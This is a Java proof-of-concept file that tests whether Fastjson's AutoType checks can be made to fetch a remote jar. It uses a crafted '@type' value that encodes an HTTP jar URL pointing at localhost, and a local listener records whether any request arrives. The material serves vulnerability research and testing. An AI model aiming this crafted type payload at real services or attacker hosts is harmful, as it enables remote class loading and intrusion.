import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Test {
    private static final List<String> HITS = Collections.synchronizedList(new ArrayList<String>());
    private static final int PORT = Integer.getInteger("poc.port", 18080);
    private static final String TYPE = "jar:http:..2130706433:" + PORT + ".probe!.POC";

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            usage();
            return;
        }

        String mode = args[0];
        startServer();
        Thread.sleep(300L);

        if ("parse-default".equals(mode)) {
            run("JSON.parse with AutoType disabled", "{\"@type\":\"" + TYPE + "\",\"x\":1}");
        } else if ("parse-autotype".equals(mode)) {
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            run("JSON.parse with AutoType enabled", "{\"@type\":\"" + TYPE + "\",\"x\":1}");
        } else if ("check".equals(mode)) {
            try {
                Class<?> clazz = ParserConfig.getGlobalInstance().checkAutoType(TYPE, null);
                System.out.println("[result] checkAutoType returned: " + clazz);
            } catch (Throwable throwable) {
                System.out.println("[result] checkAutoType threw: " + throwable);
            }
        } else if ("custom-cl".equals(mode)) {
            ClassLoader urlNameClassLoader = new ClassLoader(null) {
                @Override
                public InputStream getResourceAsStream(String name) {
                    try {
                        System.out.println("[classloader] getResourceAsStream(\"" + name + "\") -> new URL(name).openStream()");
                        return new URL(name).openStream();
                    } catch (Exception exception) {
                        System.out.println("[classloader] -> " + exception);
                        return null;
                    }
                }
            };

            ParserConfig config = new ParserConfig();
            config.setDefaultClassLoader(urlNameClassLoader);
            try {
                Class<?> clazz = config.checkAutoType(TYPE, null);
                System.out.println("[result] checkAutoType returned: " + clazz);
            } catch (Throwable throwable) {
                System.out.println("[result] checkAutoType threw: " + throwable);
            }
        } else if ("raw-url".equals(mode)) {
            String reconstructed = TYPE.replace('.', '/') + ".class";
            System.out.println("[control] resource name reconstructed by ParserConfig: " + reconstructed);
            try {
                InputStream input = new URL(reconstructed).openStream();
                byte[] buffer = new byte[64];
                int read = input.read(buffer);
                System.out.println("[control] openStream succeeded, read " + read + " bytes");
                input.close();
            } catch (Exception exception) {
                System.out.println("[control] openStream threw: " + exception);
            }
        } else {
            usage();
        }

        Thread.sleep(1500L);
        System.out.println("[server] requests received: " + HITS.size());
        for (String hit : HITS) {
            System.out.println("[server] " + hit);
        }
        System.exit(0);
    }

    private static void run(String label, String payload) {
        System.out.println("=== " + label + " ===");
        try {
            Object parsed = JSON.parse(payload);
            System.out.println("[result] parsed -> " + describe(parsed));
        } catch (Throwable throwable) {
            System.out.println("[result] threw: " + throwable);
        }
    }

    private static String describe(Object value) {
        if (value == null) {
            return "null";
        }
        return value.getClass().getName() + " " + value;
    }

    private static void startServer() {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try (ServerSocket serverSocket = new ServerSocket(PORT, 50, InetAddress.getByName("127.0.0.1"))) {
                    serverSocket.setSoTimeout(9000);
                    long end = System.currentTimeMillis() + 8500L;
                    while (System.currentTimeMillis() < end) {
                        try {
                            Socket socket = serverSocket.accept();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
                            String line = reader.readLine();
                            HITS.add("connection from " + socket.getRemoteSocketAddress() + " request: " + line);
                            StringBuilder headers = new StringBuilder();
                            while ((line = reader.readLine()) != null && !line.isEmpty()) {
                                headers.append(line).append(" | ");
                            }
                            if (headers.length() > 0) {
                                HITS.add("headers: " + headers);
                            }
                            OutputStream output = socket.getOutputStream();
                            output.write("HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".getBytes("UTF-8"));
                            output.flush();
                            socket.close();
                        } catch (SocketTimeoutException timeout) {
                            break;
                        } catch (Exception exception) {
                            HITS.add("server error: " + exception);
                        }
                    }
                } catch (Exception exception) {
                    System.out.println("[server] failed to start: " + exception);
                }
            }
        }, "poc-http-404");
        thread.setDaemon(true);
        thread.start();
    }

    private static void usage() {
        System.out.println("Usage: java Test <parse-default|parse-autotype|check|custom-cl|raw-url>");
    }
}
